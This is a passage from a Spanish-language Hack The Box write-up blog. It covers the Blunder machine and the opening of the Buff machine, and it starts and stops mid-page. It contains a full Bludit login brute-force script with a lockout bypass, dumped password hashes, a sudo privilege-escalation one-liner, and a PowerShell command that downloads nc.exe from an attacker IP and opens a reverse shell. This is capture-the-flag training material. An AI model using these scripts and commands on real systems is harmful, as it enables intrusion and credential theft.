20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Nmap 7.80 scan initiated Sat Sep 12 11:24:58 2020 as: nmap -p- --min-rate 1000 -o allports blunder.htb Nmap scan report for blunder.htb (10.10.10.191) Host is up (0.16s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 21/tcp closed ftp 80/tcp open http # Nmap done at Sat Sep 12 11:27:10 2020 -- 1 IP address (1 host up) scanned in 131.60 seconds # Nmap 7.80 scan initiated Sat Sep 12 11:29:31 2020 as: nmap -sV -sC -p 21,80 -o servicesports blunder.htb Nmap scan report for blunder.htb (10.10.10.191) Host is up (0.18s latency). PORT STATE SERVICE VERSION 21/tcp closed ftp 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 12 11:29:45 2020 -- 1 IP address (1 host up) scanned in 14.12 seconds HTTP Encontramos una pagina web en el puerto 80, donde vemos varios posts publicados por algun usuario.\nDIRSEARCH Utilizamos dirsearch para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: GET | Suffixes: php, html, txt | Threads: 75 | Wordlist size: 6564 | Request count: 6564 Error Log: /home/kali/tools/dirsearch/logs/errors-20-09-12_14-01-21.log Target: http://blunder.htb/ Output File: /home/kali/tools/dirsearch/reports/blunder.htb/20-09-12_14-01-21 [14:01:21] Starting: [14:01:27] 200 - 954B - /.github/ [14:01:28] 403 - 276B - /.htaccess.save [14:01:28] 403 - 276B - /.httr-oauth [14:01:28] 403 - 276B - /.htaccess.sample [14:01:28] 403 - 276B - /.htaccessBAK [14:01:28] 403 - 276B - /.htaccessOLD [14:01:28] 403 - 276B - /.htaccess.orig [14:01:29] 403 - 276B - /.htaccessOLD2 [14:01:29] 403 - 276B - /.htaccess.bak1 [14:01:30] 403 - 276B - /.php [14:01:34] 200 - 7KB - /%3f/ [14:01:34] 200 - 7KB - /0 [14:01:40] 200 - 3KB - /about [14:01:45] 200 - 2KB - /admin/_logs/login.txt [14:01:45] 200 - 2KB - /admin/?/login [14:01:45] 200 - 2KB - /admin/_logs/access_log [14:01:45] 200 - 2KB - /admin/_logs/access-log [14:01:45] 200 - 2KB - /admin/.config [14:01:45] 200 - 2KB - /admin/.htaccess [14:01:45] 200 - 2KB - /admin/access_log [14:01:45] 200 - 2KB - /admin/access.txt [14:01:45] 200 - 2KB - /admin/access.log [14:01:45] 200 - 2KB - /admin/account [14:01:45] 200 - 2KB - /admin/account.php [14:01:45] 200 - 2KB - /admin/account.html [14:01:45] 200 - 2KB - /admin/admin [14:01:45] 200 - 2KB - /admin/admin_login [14:01:45] 200 - 2KB - /admin/admin_login.php [14:01:45] 200 - 2KB - /admin/admin-login [14:01:45] 200 - 2KB - /admin/admin-login.html [14:01:45] 200 - 2KB - /admin/admin.html [14:01:45] 200 - 2KB - /admin/admin.php [14:01:45] 200 - 2KB - /admin/admin.shtml [14:01:45] 200 - 2KB - /admin/backup/ [14:01:45] 200 - 2KB - /admin/controlpanel [14:01:45] 200 - 2KB - /admin/controlpanel.php [14:01:45] 200 - 2KB - /admin/controlpanel.htm [14:01:45] 200 - 2KB - /admin/cp [14:01:45] 200 - 2KB - /admin/cp.php [14:01:45] 200 - 2KB - /admin/cp.html [14:01:45] 200 - 2KB - /admin/db/ [14:01:45] 200 - 2KB - /admin/error.log [14:01:45] 200 - 2KB - /admin/error.txt [14:01:46] 200 - 2KB - /admin/export.php [14:01:46] 200 - 2KB - /admin/FCKeditor [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp [14:01:46] 200 - 2KB - /admin/admin_login.html [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php [14:01:46] 200 - 2KB - /admin/admin-login.php [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx [14:01:46] 200 - 2KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php [14:01:46] 200 - 2KB - /admin/files.php [14:01:46] 200 - 2KB - /admin/file.php [14:01:46] 200 - 2KB - /admin/adminLogin.php [14:01:46] 200 - 2KB - /admin/home [14:01:46] 200 - 2KB - /admin/_logs/error-log [14:01:46] 200 - 2KB - /admin/home.html [14:01:46] 200 - 2KB - /admin/includes/configure.php~ [14:01:46] 200 - 2KB - /admin/index.php [14:01:46] 200 - 2KB - /admin/index.asp [14:01:46] 200 - 2KB - /admin/index.html [14:01:46] 200 - 2KB - /admin/log [14:01:46] 200 - 2KB - /admin/login.html [14:01:46] 200 - 2KB - /admin/login.jsp [14:01:46] 200 - 2KB - /admin/login.py [14:01:46] 200 - 2KB - /admin/login.rb [14:01:46] 200 - 2KB - /admin/logon.jsp [14:01:46] 200 - 2KB - /admin/logs/ [14:01:46] 200 - 2KB - /admin/logs/access.log [14:01:46] 200 - 2KB - /admin/logs/access_log [14:01:46] 200 - 2KB - /admin/logs/access-log [14:01:46] 200 - 2KB - /admin/logs/err.log [14:01:46] 200 - 2KB - /admin/_logs/error.log [14:01:46] 200 - 2KB - /admin/home.php [14:01:46] 200 - 2KB - /admin/logs/error-log [14:01:46] 200 - 2KB - /admin/controlpanel.html [14:01:46] 200 - 2KB - /admin/default [14:01:46] 200 - 2KB - /admin/default/login.asp [14:01:46] 200 - 2KB - /admin/logs/login.txt [14:01:46] 200 - 2KB - /admin/default.asp [14:01:47] 200 - 2KB - /admin/default/admin.asp [14:01:47] 200 - 2KB - /admin/dumper/ [14:01:47] 200 - 2KB - /admin/download.php [14:01:47] 200 - 2KB - /admin/manage [14:01:47] 200 - 2KB - /admin/manage.asp [14:01:47] 200 - 2KB - /admin/mysql/ [14:01:47] 200 - 2KB - /admin/phpmyadmin/ [14:01:47] 301 - 0B - /admin -\u0026gt; http://10.10.10.191/admin/ [14:01:47] 200 - 2KB - /admin/sqladmin/ [14:01:47] 200 - 2KB - /admin/tinymce [14:01:47] 200 - 2KB - /admin/web/ [14:01:47] 200 - 2KB - /admin/index [14:01:47] 200 - 2KB - /admin/js/tiny_mce [14:01:47] 200 - 2KB - /admin/js/tinymce/ [14:01:47] 200 - 2KB - /admin/js/tinymce [14:01:47] 200 - 2KB - /admin/js/tiny_mce/ [14:01:47] 200 - 2KB - /admin/login [14:01:47] 200 - 2KB - /admin/login.do [14:01:47] 200 - 2KB - /admin/login.htm [14:01:47] 200 - 2KB - /admin/login.php [14:01:47] 200 - 2KB - /admin/error_log [14:01:47] 200 - 2KB - /admin/manage/login.asp [14:01:47] 200 - 2KB - /admin/manage/admin.asp [14:01:47] 200 - 2KB - /admin/logs/error_log [14:01:47] 200 - 2KB - /admin/logs/error.log [14:01:48] 200 - 2KB - /admin/phpMyAdmin [14:01:48] 200 - 2KB - /admin/adminLogin.html [14:01:48] 200 - 2KB - /admin/release [14:01:48] 200 - 2KB - /admin/login.asp [14:01:48] 200 - 2KB - /admin/adminLogin.htm [14:01:48] 200 - 2KB - /admin/signin [14:01:48] 200 - 2KB - /admin/sxd/ [14:01:48] 200 - 2KB - /admin/sysadmin/ [14:01:48] 200 - 2KB - /admin/_logs/err.log [14:01:48] 200 - 2KB - /admin/_logs/error_log [14:01:48] 200 - 2KB - /admin/backups/ [14:01:48] 200 - 2KB - /admin/config.php [14:01:49] 200 - 2KB - /admin/uploads.php [14:01:49] 200 - 2KB - /admin/upload.php [14:01:49] 200 - 2KB - /admin/user_count.txt [14:01:49] 200 - 2KB - /admin/tiny_mce [14:01:49] 200 - 2KB - /admin/ [14:01:49] 200 - 2KB - /admin/_logs/access.log [14:01:50] 200 - 2KB - /admin/pol_log.txt [14:01:50] 200 - 2KB - /admin/private/logs [14:01:50] 200 - 2KB - /admin/scripts/fckeditor [14:01:50] 200 - 2KB - /admin/pma/ [14:01:50] 200 - 2KB - /admin/secure/logon.jsp [14:01:55] 200 - 2KB - /admin/admin/login [14:02:05] 200 - 2KB - /admin/adminLogin [14:02:10] 301 - 0B - /domcfg.nsf/?open -\u0026gt; http://10.10.10.191/domcfg.nsf [14:02:23] 200 - 30B - /install.php [14:02:27] 200 - 1KB - /LICENSE [14:02:43] 200 - 22B - /robots.txt [14:02:46] 403 - 276B - /server-status [14:02:47] 403 - 276B - /server-status/ [14:02:55] 200 - 118B - /todo.txt Task Completed En todo.txt encontramos una lista de cosas por hacer y vemos en una que aparece el nombre de un posible usuario fergus.\n1 2 3 4 5 6 kali@kali:~/htb/blunder$ curl http://blunder/todo.txt -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING kali@kali:~/htb/blunder$ BLUDIT - VULNERABLE Dentro del panel de admin logramos ver el titulo y en la cookie muestra el nombre Bludit, investigamos este y encontramos que pertenece a Bludit CMS. Exploramos las vulnerabilidades de este CMS y encontramos que es posible realizar un ataque de fuerza bruta.\nConfiguramos el exploit para usar un wordlist. Luego de utilizar algunos wordlist no encontramos la contraseña para el usuario fergus, utilizar el wordlist rockyou.txt no seria una buena idea ya que comunmente las maquinas de HTB no necesitan un wordlist muy grande.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #!/usr/bin/env python3 import re import requests host = \u0026#39;http://10.10.10.191\u0026#39; login_url = host + \u0026#39;/admin/login\u0026#39; username = \u0026#39;fergus\u0026#39; wordlist = open(\u0026#39;/usr/share/nmap/nselib/data/passwords.lst\u0026#39;) for password in wordlist: password = password.strip() session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(\u0026#39;input.+?name=\u0026#34;tokenCSRF\u0026#34;.+?value=\u0026#34;(.+?)\u0026#34;\u0026#39;, login_page.text).group(1) print(\u0026#39;[*] Trying: {p}\u0026#39;.format(p = password)) headers = { \u0026#39;X-Forwarded-For\u0026#39;: password, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\u0026#39;, \u0026#39;Referer\u0026#39;: login_url } data = { \u0026#39;tokenCSRF\u0026#39;: csrf_token, \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, \u0026#39;save\u0026#39;: \u0026#39;\u0026#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if \u0026#39;location\u0026#39; in login_result.headers: if \u0026#39;/admin/dashboard\u0026#39; in login_result.headers[\u0026#39;location\u0026#39;]: print() print(\u0026#39;SUCCESS: Password found!\u0026#39;) print(\u0026#39;Use {u}:{p} to login.\u0026#39;.format(u = username, p = password)) print() break En la pagina de inicio vemos varios posts, utilizamos estos para crear un wordlist para posible contraseñas al igual que en HTB - VAULT.\n1 2 3 4 5 kali@kali:~/htb/blunder$ cewl -w bludit-word.txt -e -a http://blunder.htb CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) kali@kali:~/htb/blunder$ wc -l bludit-word.txt 329 bludit-word.txt kali@kali:~/htb/blunder$ Ejecutamos nuevamente el exploit, esta vez con nuestro wordlist y logramos ver la contraseña de este usuario.\n1 2 3 4 5 6 7 8 kali@kali:~/htb/blunder$ python3 bludit_brute_force.py [... REDACTED ...] [*] Trying: RolandDeschain SUCCESS: Password found! Use fergus:RolandDeschain to login. kali@kali:~/htb/blunder$ Ingresamos con las credenciales encontradas y vemos el dashboard de este CMS.\nAdemás de el exploit anterior encontramos otro el cual sube un archivo con una shell inversa. Tambien existe otro el cual ejecuta una shell inversa realizando todos los pasos para la explotacion, pasos que el exploit de exploit-db no realiza. Configuamos este ultimo exploit, ponemos a la escucha netcat, ejecutamos y logramos obtener una shell con usuario www-data.\nHUGO - USER Realizamos una enumeracion en la maquina y encontramos dos versiones de Blundit en ambas carpetas encontramos un archivo de Blundit unas credenciales de usuarios de este CMS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ ls -lah ls -lah total 80K drwxr-xr-x 3 www-data www-data 4.0K May 19 11:28 . drwxr-xr-x 7 www-data www-data 4.0K Nov 27 2019 .. -rw-r--r-- 1 www-data www-data 438 Apr 28 11:24 categories.php -rw-r--r-- 1 www-data www-data 3.4K Apr 28 11:35 pages.php drwxr-xr-x 6 www-data www-data 4.0K Nov 27 2019 plugins -rw-r--r-- 1 www-data www-data 42K Sep 12 19:40 security.php -rw-r--r-- 1 www-data www-data 1.3K May 19 11:28 site.php -rw-r--r-- 1 www-data www-data 2.3K Apr 28 11:24 syslog.php -rw-r--r-- 1 www-data www-data 52 Apr 28 11:24 tags.php -rw-r--r-- 1 www-data www-data 1.3K Apr 28 11:20 users.php www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php cat users.php \u0026lt;?php defined(\u0026#39;BLUDIT\u0026#39;) or die(\u0026#39;Bludit CMS.\u0026#39;); ?\u0026gt; { \u0026#34;admin\u0026#34;: { \u0026#34;nickname\u0026#34;: \u0026#34;Admin\u0026#34;, \u0026#34;firstName\u0026#34;: \u0026#34;Administrator\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;bfcc887f62e36ea019e3295aafb8a3885966e265\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;5dde2887e7aca\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 07:40:55\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;b380cb62057e9da47afce66b4615107d\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;fergus\u0026#34;: { \u0026#34;firstName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nickname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;author\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7\u0026#34;, \u0026#34;salt\u0026#34;: \u0026#34;jqxpjfnv\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 13:26:44\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;0e8011811356c0c5bd2211cba8c50471\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mastodon\u0026#34;: \u0026#34;\u0026#34; } }www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls -lah ls -lah total 80K drwxr-xr-x 3 www-data www-data 4.0K May 19 10:10 . drwxr-xr-x 7 www-data www-data 4.0K May 19 10:03 .. -rw-r--r-- 1 www-data www-data 438 May 19 10:03 categories.php -rw-r--r-- 1 www-data www-data 3.4K May 19 10:03 pages.php drwxr-xr-x 6 www-data www-data 4.0K May 19 10:03 plugins -rw-r--r-- 1 www-data www-data 42K May 19 10:03 security.php -rw-r--r-- 1 www-data www-data 1.3K May 19 10:03 site.php -rw-r--r-- 1 www-data www-data 2.3K May 19 10:03 syslog.php -rw-r--r-- 1 www-data www-data 52 May 19 10:03 tags.php -rw-r--r-- 1 www-data www-data 597 May 19 10:10 users.php www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php cat users.php \u0026lt;?php defined(\u0026#39;BLUDIT\u0026#39;) or die(\u0026#39;Bludit CMS.\u0026#39;); ?\u0026gt; { \u0026#34;admin\u0026#34;: { \u0026#34;nickname\u0026#34;: \u0026#34;Hugo\u0026#34;, \u0026#34;firstName\u0026#34;: \u0026#34;Hugo\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;User\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;faca404fd5c0a31cf1897b823c695c85cffeb98d\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;registered\u0026#34;: \u0026#34;2019-11-27 07:40:55\u0026#34;, \u0026#34;tokenRemember\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tokenAuth\u0026#34;: \u0026#34;b380cb62057e9da47afce66b4615107d\u0026#34;, \u0026#34;tokenAuthTTL\u0026#34;: \u0026#34;2009-03-15 14:00\u0026#34;, \u0026#34;twitter\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;facebook\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;instagram\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;codepen\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;linkedin\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;github\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;gitlab\u0026#34;: \u0026#34;\u0026#34;} } www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ Utilizamos la pagina de crackstation para obtener la contraseña del usuario hugo.\nCambiamos de usuario utilizando la contraseña encontrada y logramos obtener nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando /bin/bash. Pero al ejecutarlo nos muestra un mensaje de error. Utilizamos la misma forma utilizada en THM - Agent Sudo para obtener nuestra shell con root y flag root.txt.\n1 sudo -u#-1 /bin/bash FREE FLAG (?) Encontramos en la carpeta Pictures de shaun unos screenshots, en uno de ellos vemos la flag root.txt con un \u0026ldquo;poc\u0026rdquo; de lo que parece ser una explotacion binaria y en otro un archivo de configuracion.\n1 2 3 4 5 6 7 www-data@blunder:/home/shaun/Pictures$ ls -lah ls -lah total 624K drwxr-xr-x 2 shaun shaun 4.0K Nov 28 2019 . drwxr-xr-x 16 shaun shaun 4.0K Apr 28 12:13 .. -rw-r--r-- 1 shaun shaun 441K Nov 28 2019 \u0026#39;Screenshot from 2019-11-28 13-17-29.png\u0026#39; -rw-r--r-- 1 shaun shaun 171K Nov 28 2019 \u0026#39;Screenshot from 2019-11-28 14-02-13.png\u0026#39; ","description":"Blunder es una maquina de HackTheBox, Bludit CMS esta corriendo y su version tiene multiples vulnerabilidades, aprovechamos una de ellas para realizar un ataque de contraseñas utilizando un diccionario generado con Cewl, luego ejecutamos una shell inversa. Realizamos movimiento lateral con contraseñas almacenadas por Bludit. Una vulnerabilidad de sudo nos permitió obtener acceso privilegiado.","id":88,"section":"posts","tags":["dirsearch","sudo privesc"],"title":"Hack The Box - Blunder","uri":"https://sckull.github.io/posts/blunder/"},{"content":"\rBuff es una maquina de HackTheBox con SO Windows, encontramos un RCE en Gym Managmente Software lo que nos dio acceso con el usuario Shaun. Observamos un puerto localmente perteneciente a CloudMe, ejecutamos un reverse tunneling para poder explotar la vulnerabilidad Buffer Overflow y obtener acceso privilegiado.\nInformacion de la Maquina Nombre Buff OS Windows Puntos 20 Dificultad Facil IP 10.10.10.198 Maker egotisticalSW\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.5, 5.6, 7.5, 2.5, 4.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 7, 9, 1, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto 7680 y el puerto http (8080) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # Nmap 7.80 scan initiated Sat Sep 12 02:35:25 2020 as: nmap -Pn -p- --min-rate 1000 -o allports buff.htb Nmap scan report for buff.htb (buff.htb) Host is up (0.21s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 7680/tcp open pando-pub 8080/tcp open http-proxy # Nmap done at Sat Sep 12 02:38:42 2020 -- 1 IP address (1 host up) scanned in 197.50 seconds # Nmap 7.80 scan initiated Sat Sep 12 02:39:30 2020 as: nmap -Pn -sV -sC -p 7689,8080 -o serviceports buff.htb Nmap scan report for buff.htb (buff.htb) Host is up (0.068s latency). PORT STATE SERVICE VERSION 7689/tcp filtered collaber 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n\u0026#39;s Bro Hut Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Sep 12 02:39:58 2020 -- 1 IP address (1 host up) scanned in 27.62 seconds HTTP Encontramos una pagina web en el puerto 80.\nDIRBUSTER Utilizamos dirbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: GET | Suffixes: php, html, txt | Threads: 150 | Wordlist size: 4614 | Request count: 4614 Error Log: /home/kali/tools/dirsearch/logs/errors-20-09-12_02-45-06.log Target: http://buff.htb:8080/ Output File: /home/kali/tools/dirsearch/reports/buff.htb/20-09-12_02-45-08 [02:45:08] Starting: [02:45:10] 200 - 5KB - / [02:45:13] 403 - 1KB - /admin.pl [02:45:14] 403 - 1KB - /admin.cgi [02:45:17] 403 - 1KB - /AT-admin.cgi [02:45:18] 403 - 1KB - /aux [02:45:20] 403 - 1KB - /cachemgr.cgi [02:45:21] 301 - 334B - /boot -\u0026gt; http://buff.htb:8080/boot/ [02:45:23] 403 - 1KB - /com1 [02:45:23] 403 - 1KB - /com2 [02:45:23] 403 - 1KB - /cgi-bin/ [02:45:24] 403 - 1KB - /com3 [02:45:25] 403 - 1KB - /con [02:45:33] 301 - 332B - /ex -\u0026gt; http://buff.htb:8080/ex/ [02:45:34] 503 - 1KB - /examples [02:45:41] 200 - 5KB - /index.php [02:45:42] 301 - 337B - /include -\u0026gt; http://buff.htb:8080/include/ [02:45:43] 301 - 333B - /img -\u0026gt; http://buff.htb:8080/img/ [02:45:43] 200 - 18KB - /LICENSE [02:45:43] 403 - 1KB - /licenses [02:45:45] 200 - 18KB - /license [02:45:45] 403 - 1KB - /lpt1 [02:45:45] 403 - 1KB - /lpt2 [02:45:55] 403 - 1KB - /phpmyadmin [02:45:57] 301 - 337B - /profile -\u0026gt; http://buff.htb:8080/profile/ [02:45:57] 403 - 1KB - /prn [02:45:58] 403 - 1KB - /nul [02:46:03] 403 - 1KB - /server-info [02:46:03] 403 - 1KB - /server-status Task Completed SHAUN - USER Al revisar la pagina vemos la version de la aplicacion web la cual es Gym Management Software 1.0.\nExploramos si existe una vulnerabilidad en esta aplicacion y encontramos que tiene una vulnerabilidad de RCE utilizando una imagen. Descargamos el exploit, ejecutamos y logramos obtener una shell y nuestra flag user.txt.\nEjecutamos una shell inversa con netcat, el cual descargamos en la maquina y ejecutamos esta hacia nuestra IP y puerto.\n1 2 powershell -command \u0026#34;\u0026amp; { iwr 10.10.10.40/nc.exe -OutFile C:\\Users\\shaun\\Desktop\\nc.exe }\u0026#34; C:\\Users\\shaun\\Desktop\\nc.exe -e cmd 10.10.10.40 443 Creamos un pequeño servidor http con python3 y pusimos a la escucha netcat, logrando obtener una shell con el usuario SHAUN.\nPRIVILEGE ESCALATION Realizamos una pequeña enumeracion en la maquina y encontramos un ejecutable en la carpeta de descargas del usuario shaun.\nAl realizar una busqueda de este archivo encontramos un exploit que afecta a un servicio. Además de ello encontramos el puerto 8888 en el cual corre este servicio en la maquina, pero este esta de manera local.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 C:\\xampp\\htdocs\\gym\\upload\u0026gt;tasklist | find /i \u0026#34;CloudMe\u0026#34; tasklist | find /i \u0026#34;CloudMe\u0026#34; CloudMe.exe 7388 0 18,628 K C:\\xampp\\htdocs\\gym\\upload\u0026gt;netstat -ano | find /i \u0026#34;LISTENING\u0026#34; netstat -ano | find /i \u0026#34;LISTENING\u0026#34; TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 956 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5040 0.0.0.0:0 LISTENING 5736 TCP 0.0.0.0:7680 0.0.0.0:0 LISTENING 4256 TCP 0.0.0.0:8080 0.0.0.0:0 LISTENING 3648 